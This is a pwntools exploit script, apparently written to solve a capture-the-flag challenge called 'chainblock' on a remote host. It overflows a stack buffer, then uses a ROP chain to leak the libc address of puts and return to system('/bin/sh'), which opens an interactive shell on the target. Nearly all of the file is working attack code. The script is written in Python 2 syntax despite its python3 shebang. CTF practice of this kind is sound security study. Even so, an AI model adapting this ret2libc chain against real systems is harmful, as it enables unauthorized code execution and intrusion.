#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.be.ax --port 5000 ./chainblock
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./chainblock')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.be.ax'
port = int(args.PORT or 5000)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fe000)
# RUNPATH:  './'

io = start()
# libc =ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc =ELF("./libc.so.6")
pop_rdi = 0x0000000000401493
p = "a"*(256+8)
p += p64(pop_rdi)
p += p64(exe.got['puts'])
p += p64(exe.plt['puts'])
p += p64(exe.sym['verify'])
io.sendlineafter(": ",p)
io.recvline()
data = u64(io.recvline()[:-1].ljust(8,"\x00"))
libc.address = data - libc.sym['puts']
print hex(data)
print hex(libc.address)

p = "a"*(256+8)
p += p64(pop_rdi)
p += p64(libc.search("/bin/sh").next())
p += p64(pop_rdi+1)
p += p64(libc.sym['system'])
io.sendlineafter(": ",p)

io.interactive()

